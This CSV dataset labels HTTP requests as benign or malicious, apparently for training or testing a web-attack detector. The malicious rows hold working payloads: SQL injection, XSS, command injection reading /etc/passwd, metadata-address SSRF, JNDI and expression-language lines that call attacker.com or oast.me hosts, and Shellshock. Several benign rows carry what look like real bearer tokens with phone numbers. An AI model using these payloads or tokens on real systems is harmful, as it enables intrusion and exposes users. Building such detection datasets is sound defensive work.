method,path,query,headers,body,ua,label
POST,/user/ui/theme,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","[{""query"": ""...""}, {""query"": ""...""}]",,1
GET,/api/v1/dashboard/widgets/sales-chart/data,,Content-Type: application/json,,,0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,url=http://malicious.com,Authorization: Bearer token123,,,1
GET,/index.php,"q="" onmouseover=alert(1) """,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/admin/reports/sales.csv,year=2025,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/api/v1/documents,,Content-Type: application/json,,,0
POST,/logs/client,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/static/css/style.css,,Authorization: Bearer token123,,,0
GET,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
PUT,/login,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,sqlmap/1.5.2,1
GET,/admin/users,limit=20&offset=40,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
PUT,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/search,q=security,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/favicon.ico,,,,,0
POST,/logs/client,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/index.php,q=http://169.254.169.254/latest/meta-data,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/index.php,q=| cat /etc/passwd,Host: example.com; Accept: */*,,Nikto/2.1.6,1
POST,/api/v1/user/avatar,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: %0d%0aBcc: victim@example.com",,,1
GET,/,rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/search,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,sqlmap/1.5.2,1
GET,/,,Content-Type: application/json; Payload: admin*)(| (password=*)),,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: %0d%0a* CAPABILITY",,,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/graphql,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/api/v1/user/avatar,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/web-api/orders/260209PVSDRVBJS/paymentUrl,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3Nzc1NjY3ODQiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiZmUzOTY4NzktNTUwNS00ZTJiLTgwZDEtMDJiZjQ3MDBiODU5IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3Nzc1NjY3ODQiLCJzdWIiOiJXRUJTSVRFQDA3Nzc1NjY3ODQiLCJpYXQiOjE3NzA2MzAzMTYsImV4cCI6MTc3MTIzNTExNn0.kRijepbD35UYaIBSy-UtUWhxSvWWgJyY3qeRmlPUSRI; Connection: keep-alive; Content-Length: 2; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: a1d37ef3-f309-479d-9e35-3dbe03d594ab",,python-requests/2.32.5,0
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,Content-Type: application/json; Payload: ; cat /etc/passwd,,,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/api/v1/search/suggest,q=secur,Authorization: Bearer token123,,,0
GET,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/,,Authorization: Bearer token123,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,1
GET,/,php://filter/convert.base64-encode/resource=index.php,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
POST,/login,,Host: example.com; Accept: */*,username=user904&password=pass867,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,Content-Type: application/json; Payload: http://attacker.com/shell.txt,,,1
GET,/,,Content-Type: application/json; Payload: X-Forwarded-Host: attacker.com,,,1
GET,/wp-content/plugins/mail-masta/inc/lists/csvexport.php,pl=/etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",1
DELETE,/search,,Host: example.com; Accept: */*,input=; ls -la,Nikto/2.1.6,1
GET,/locales/vi-VN.json,,Authorization: Bearer token123,,,0
GET,/favicon.ico,,,,,0
POST,/logs/client,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/client/manage/ourphp_out.php,ourphp_admin=logout&out=</script><script>alert(document.domain)</script>,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 maglev/23335.232.2637.4844/49",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 maglev/23335.232.2637.4844/49",1
GET,/,adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20d6d5bt565jrc87ck692gzsym1em9spt3e.oast.me')%7d,Authorization: Bearer token123,,,1
POST,/,,Content-Type: application/json,{{7*7}} or {{config.items()}},,1
PUT,/login,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nikto/2.1.6,1
GET,/index.php,m=default&c=user&a=register&u=0,"Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; Referer: 554fcae493e564ee0dc75bdf2ebf94cabought_notes|a:1:{s:2:""id"";s:49:""0&&updatexml(1,concat(0x7e,(database()),0x7e),1)#"";}; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",1
GET,/docs/api/introduction,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/favicon.ico,,,,,0
GET,/,,Authorization: Bearer token123; Payload: ; /bin/c?t /e*c/p?sswd,,,1
GET,/robots.txt,,Authorization: Bearer token123,,,0
GET,/search,q=security,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/about/function.php,,Host: dyn0cb420673172.sunny.edgevnpay.vn,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,Authorization: Bearer token123; Payload: id=1; SELECT pg_sleep(5)--,,,1
PUT,/login,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nmap Scripting Engine,1
PUT,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,Content-Type: application/json; Payload: PATCH /api/v1/settings/theme,,,0
GET,/api/v1/search/suggest,q=secur,Authorization: Bearer token123,,,0
GET,/,,"Authorization: Bearer token123; Payload: <foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/_next/static/chunks/3543.f80bedbb7039d3c1.js,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Accept-Language: vi-VN,vi;q=0.9; Connection: keep-alive; Cookie: _fbp=fb.1.1763309335323.311554689555741752; ttcsid=1770766487804::NGQK6D59lUH1VznRdIQO.26.1770767107858.0; ttcsid_CQNEHUJC77UD2I8MDM90=1770766487804::x_lOuIsyuIMXqO34ZoUP.14.1770767107858.1; ttcsid_CQQA2PJC77U11VCBE7G0=1770766487805::RCeq1CFnWzxMyb0HmKrZ.26.1770767107732.1; _ga_1XRVJ9DDS6=GS2.1.s1770766487$o25$g1$t1770767065$j45$l0$h0; _ga=GA1.1.2114396501.1764186514; _tt_enable_cookie=1; _ttp=01KB0VBRSC4E14NJG3C10NG9CF_.tt.1; _gcl_au=1.1.743533541.1764186514; Host: bidvmb.vnshop.vn; Referer: https://bidvmb.vnshop.vn/cart; Sec-Fetch-Dest: script; Sec-Fetch-Mode: no-cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",0
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user696&password=pass896,Mozilla/5.0 (Linux; Android 11),0
POST,/api/v1/sync/video,,Authorization: Bearer token123,,,0
GET,/search,q=O'Reilly,Authorization: Bearer token123,,,0
GET,/,,Content-Type: application/json; Payload: || ls -la,,,1
DELETE,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/favicon.ico,,,,,0
GET,/search,q=..\..\..\windows\system32,Host: example.com; Accept: */*,,Nikto/2.1.6,1
POST,/admin,,Host: example.com; Accept: */*,input=' OR 'x'='x,Nikto/2.1.6,1
POST,/blog/comment,,Authorization: Bearer token123,,,0
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","{""$where"": ""this.user == 'admin'""}",,1
POST,/index.php,,Host: example.com; Accept: */*,input=admin'--,sqlmap/1.5.2,1
POST,/search,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,Nikto/2.1.6,1
GET,/feed/news.rss,,Content-Type: application/json,,,0
DELETE,/search,,Host: example.com; Accept: */*,input=../../../../etc/passwd,curl/7.68.0,1
GET,/search,q=admin'--,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
POST,/,,Content-Type: application/json,{{7*7}} or {{config.items()}},,1
GET,/config/app-settings.json,,Content-Type: application/json,,,0
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,Authorization: Bearer token123; Payload: ' or '1'='1,,,1
PUT,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
DELETE,/admin,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nmap Scripting Engine,1
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
POST,/login,,Host: example.com; Accept: */*,input=' OR 1=1--,Nikto/2.1.6,1
GET,/api/v1/users,q=http://169.254.169.254/latest/meta-data,Host: example.com; Accept: */*,,curl/7.68.0,1
POST,/products,id=123,Host: example.com; Accept: */*,username=user848&password=pass485,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ${jndi:ldap://attacker.com/a}",,,1
DELETE,/index.php,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,Nmap Scripting Engine,1
GET,/auth/verify-email,code=v987654321,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/user/password-update,,Content-Type: application/json,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: expect://id",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: php://input",,,1
GET,/admin/reports/sales.csv,year=2025,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/api/v1/search/suggest,q=secur,Authorization: Bearer token123,,,0
GET,/r2w/signIn.do,urll=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; CrOS x86_64 15240.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",,"Mozilla/5.0 (X11; CrOS x86_64 15240.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",1
GET,/,,Authorization: Bearer token123; Payload: id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
DELETE,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,Content-Type: application/json; Payload: ..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: /index.php?name=Guest%0d%0aSet-Cookie: session=1",,,1
GET,/podcasts/latest.xml,,Authorization: Bearer token123,,,0
GET,/,,Content-Type: application/json; Payload: id=1' OR '1'='1,,,1
POST,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","{""$where"": ""this.user == 'admin'""}",,1
GET,/,,"Authorization: Bearer token123; Payload: id=1 UNION SELECT null, user(), database()--",,,1
POST,/newsletter/subscribe,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/api/v1/sync/video,,Authorization: Bearer token123,,,0
GET,/settings/security,,Authorization: Bearer token123,,,0
GET,/api/v1/support/tickets/404/attachments,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,"rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5(999999999),null,null%20--%20g","Accept-Encoding: gzip; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",1
GET,/,,"Authorization: Bearer token123; Payload: id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
PUT,/billing/address,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: ../../../../etc/passwd%00",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: OPTIONS /api/v1/data",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: $(whoami)",,,1
GET,/auth/google/callback,,Content-Type: application/json,,,0
POST,/team/invite,,Content-Type: application/json,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: () { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,Authorization: Bearer token123; Payload: Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: java\tscript:alert(1)",,,1
POST,/newsletter/subscribe,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/user/mfa/setup-qr,,Authorization: Bearer token123,,,0
GET,/user/orders,status=shipped&from=2025-01-01,Content-Type: application/json,,,0
GET,/admin,q=| cat /etc/passwd,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: cos\nsystem\n(S'id'\ntR.",,,1
POST,/reviews,,Authorization: Bearer token123,,,0
POST,/,,Authorization: Bearer token123,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,1
POST,/web-api/orders/260209PYTHPSSPN/paymentUrl,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzA1NzUzNzYiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiN2M1YjI1N2EtODRlMS00NTg5LTk1OGQtNTZiYzE5Njk1YjQ3IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzA1NzUzNzYiLCJzdWIiOiJXRUJTSVRFQDA3NzA1NzUzNzYiLCJpYXQiOjE3NzA2MzAzNDcsImV4cCI6MTc3MTIzNTE0N30.Rp3eh9uBd9kdpu3iI1eNfPtfcGllah-wNN5YRJNVI5o; Connection: keep-alive; Content-Length: 2; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 76b07467-6aa4-44fa-89ea-7eda17de0941",,python-requests/2.32.5,0
GET,/wp-admin/admin-ajax.php,"action=woot_get_smth&what={%22call_action%22:%22x%22,%22more_data%22:%22\u003cscript%3Ealert(document.domain)\u003c/script%3E%22}","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",1
GET,/api/v1/users,"q=' UNION SELECT NULL,NULL--",Host: example.com; Accept: */*,,curl/7.68.0,1
PUT,/api/v1/user/settings,,Authorization: Bearer token123,,,0
GET,/web-api/orders/17baa579-f0d0-4fdd-8b1a-638def8a36b1,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzQ2OTQ3NzIiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiZmFmMTViZTYtZjk2OS00MWY4LWIxZGUtZTZkYjYyYzlmMzRiIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzQ2OTQ3NzIiLCJzdWIiOiJXRUJTSVRFQDA3NzQ2OTQ3NzIiLCJpYXQiOjE3NzA2MzAzNzIsImV4cCI6MTc3MTIzNTE3Mn0.0D2DKPb7bfJELPAvSSDfi3fqQP3O9BQetS4xIvXDEX0; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 10c2e3c5-3e83-4e4c-b4b4-5a877469103f",,python-requests/2.32.5,0
GET,/api/v1/users,"q=' UNION SELECT NULL,NULL--",Host: example.com; Accept: */*,,Nikto/2.1.6,1
POST,/products,,Host: example.com; Accept: */*,username=user281&password=pass456,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,Content-Type: application/json; Payload: || ls -la,,,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,Content-Type: application/json; Payload: ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,Content-Type: application/json,,,0
POST,/,,Authorization: Bearer token123,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,/,,Content-Type: application/json; Payload: Host: evil.com,,,1
GET,/login,q=..\..\..\windows\system32,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/products/compare,base=p1&target=p2,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/favicon.ico,,,,,0
GET,/,,Authorization: Bearer token123; Payload: id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/auth/realms/master/protocol/openid-connect/auth,scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://d6d5bt565jrc87ck692gns18e7zeeka7x.oast.me/,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35",1
GET,/,call=getRawDataFromDatabase&query=file:///etc/passwd,Content-Type: application/json,,,1
GET,/,,Authorization: Bearer token123; Payload: User-Agent: ' OR SLEEP(5) OR ',,,1
PUT,/api/v1/profile,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
DELETE,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
POST,/careers/apply,,Authorization: Bearer token123,,,0
